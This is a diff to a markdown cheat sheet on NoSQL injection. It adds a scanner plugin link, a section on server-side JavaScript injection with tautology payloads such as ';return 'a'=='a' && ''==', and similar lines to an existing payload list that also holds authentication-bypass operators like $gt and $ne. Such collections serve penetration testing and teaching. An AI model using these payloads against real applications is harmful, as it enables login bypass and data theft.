@@ -19,6 +19,7 @@
 
 * [NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool](https://github.com/codingo/NoSQLMap)
 * [nosqlilab - A lab for playing with NoSQL Injection](https://github.com/digininja/nosqlilab)
+* [Burp-NoSQLiScanner - Plugin available in burpsuite](https://github.com/matrix/Burp-NoSQLiScanner)  
 
 ## Exploit
 
@@ -68,6 +69,14 @@ Extract data with "in"
 
 ```json
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+```
+
+### SSJI 
+
+```json
+';return 'a'=='a' && ''=='
+";return 'a'=='a' && ''=='
+0;return true
 ```
 
 
@@ -165,6 +174,9 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 '%20%26%26%20this.passwordzz.match(/.*/)//+%00
 {$gt: ''}
 [$ne]=1
+';return 'a'=='a' && ''=='
+";return(true);var xyz='a
+0;return true
 ```
 
 ## References
@@ -173,3 +185,4 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 * [Testing for NoSQL injection - OWASP/WSTG](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
 * [NoSQL injection wordlists - cr0hn](https://github.com/cr0hn/nosqlinjection_wordlists)
 * [NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon](https://zanon.io/posts/nosql-injection-in-mongodb)
+* [Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
